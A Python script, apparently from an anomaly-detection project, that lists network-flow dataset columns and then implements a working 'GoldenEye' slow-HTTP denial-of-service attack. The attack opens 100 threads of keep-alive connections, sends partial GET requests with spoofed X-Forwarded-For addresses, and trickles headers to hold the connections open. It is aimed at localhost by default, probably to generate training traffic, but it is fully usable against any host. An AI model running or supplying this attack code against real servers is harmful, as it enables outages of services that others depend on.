import sys
import time
import socket
import random
import threading
import os
import glob
import pandas as pd

# List of columns to be read from the CSV files
COLUMNS = [
    "Destination Port", "Flow Duration", "Total Fwd Packets", "Total Backward Packets", 
    "Total Length of Fwd Packets", "Total Length of Bwd Packets", "Fwd Packet Length Max", 
    "Fwd Packet Length Min", "Fwd Packet Length Mean", "Fwd Packet Length Std", 
    "Bwd Packet Length Max", "Bwd Packet Length Min", "Bwd Packet Length Mean", 
    "Bwd Packet Length Std", "Flow Bytes/s", "Flow Packets/s", "Flow IAT Mean", 
    "Flow IAT Std", "Flow IAT Max", "Flow IAT Min", "Fwd IAT Total", "Fwd IAT Mean", 
    "Fwd IAT Std", "Fwd IAT Max", "Fwd IAT Min", "Bwd IAT Total", "Bwd IAT Mean", 
    "Bwd IAT Std", "Bwd IAT Max", "Bwd IAT Min", "Fwd PSH Flags", "Bwd PSH Flags", 
    "Fwd URG Flags", "Bwd URG Flags", "Fwd Header Length", "Bwd Header Length", 
    "Fwd Packets/s", "Bwd Packets/s", "Min Packet Length", "Max Packet Length", 
    "Packet Length Mean", "Packet Length Std", "Packet Length Variance", "FIN Flag Count", 
    "SYN Flag Count", "RST Flag Count", "PSH Flag Count", "ACK Flag Count", "URG Flag Count", 
    "CWE Flag Count", "ECE Flag Count", "Down/Up Ratio", "Average Packet Size", 
    "Avg Fwd Segment Size", "Avg Bwd Segment Size", "Fwd Header Length.1", "Fwd Avg Bytes/Bulk", 
    "Fwd Avg Packets/Bulk", "Fwd Avg Bulk Rate", "Bwd Avg Bytes/Bulk", "Bwd Avg Packets/Bulk", 
    "Bwd Avg Bulk Rate", "Subflow Fwd Packets", "Subflow Fwd Bytes", "Subflow Bwd Packets", 
    "Subflow Bwd Bytes", "Init_Win_bytes_forward", "Init_Win_bytes_backward", "act_data_pkt_fwd", 
    "min_seg_size_forward", "Active Mean", "Active Std", "Active Max", "Active Min", "Idle Mean", 
    "Idle Std", "Idle Max", "Idle Min", "Flow Bytes/s * Flow Duration", 
    "Total Length of Fwd Packets * Total Length of Bwd Packets", "Fwd Packets/s * Bwd Packets/s", 
    "Flow Duration^2", "Flow Duration^3", "Mean Packet Length", "Std Packet Length", 
    "Flow Duration / Total Fwd Packets", "Flow Duration / Total Backward Packets", 
    "Total Fwd Packets / Total Backward Packets", "Fwd Packets/s / Bwd Packets/s", 
    "Flow Bytes/s / Flow Packets/s", "Label", "Protocol"
]

DATA_FOLDER = r"E:/CloudAnomalyDetectionSystem/data/train"

class GoldenEye:
    def __init__(self, target_host="127.0.0.1", target_port=8080):
        self.target_host = target_host
        self.target_port = target_port  # Port is fixed at 8080
        self.running = True
        self.connections = []
        self.fake_ips = [
            f"{random.randint(1, 255)}.{random.randint(1, 255)}."
            f"{random.randint(1, 255)}.{random.randint(1, 255)}"
            for _ in range(10)
        ]

    def create_socket(self):
        """Creates a new socket for the attack and sends a partial HTTP GET request."""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(4)
            sock.connect((self.target_host, self.target_port))
            
            fake_ip = random.choice(self.fake_ips)
            request = (
                f"GET /?{random.randint(1, 2000)} HTTP/1.1\r\n"
                f"Host: {self.target_host}\r\n"
                f"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"
                f"X-Forwarded-For: {fake_ip}\r\n"
                f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
                f"Accept-Language: en-US,en;q=0.5\r\n"
                f"Accept-Encoding: gzip, deflate\r\n"
                f"Cache-Control: no-cache\r\n"
                f"Pragma: no-cache\r\n"
                f"Connection: keep-alive\r\n"
                f"\r\n"
            )
            sock.send(request.encode())
            return sock
        except socket.error:
            return None

    def attack(self):
        """Maintains each connection and sends periodic keep-alive requests."""
        while self.running:
            try:
                sock = self.create_socket()
                if sock:
                    self.connections.append(sock)
                    print(f"Connection established - Total connections: {len(self.connections)}")
                    
                    while self.running:
                        try:
                            sock.send(f"X-a: {random.randint(1, 5000)}\r\n".encode())
                            time.sleep(random.uniform(0.1, 0.5))
                        except socket.error:
                            break
                            
                    if sock in self.connections:
                        self.connections.remove(sock)
                    sock.close()
            except Exception as e:
                print(f"Error in attack thread: {str(e)}")
                continue

    def start_attack(self):
        """Starts the GoldenEye DoS attack immediately."""
        print(f"Starting GoldenEye DoS attack on {self.target_host}:{self.target_port}")
        
        threads = []
        for _ in range(100):  # More concurrent connections for faster attack
            thread = threading.Thread(target=self.attack)
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        try:
            while True:
                time.sleep(1)
                print(f"Active connections: {len(self.connections)}")
        except KeyboardInterrupt:
            self.stop_attack()
            
    def stop_attack(self):
        """Stops the attack and closes all connections."""
        print("\nStopping GoldenEye attack...")
        self.running = False
        for sock in self.connections:
            try:
                sock.close()
            except:
                pass
        self.connections.clear()
        print("Attack stopped")


def main():
    golden_eye = GoldenEye(target_host="127.0.0.1", target_port=8080)
    golden_eye.start_attack()

if __name__ == "__main__":
    main()
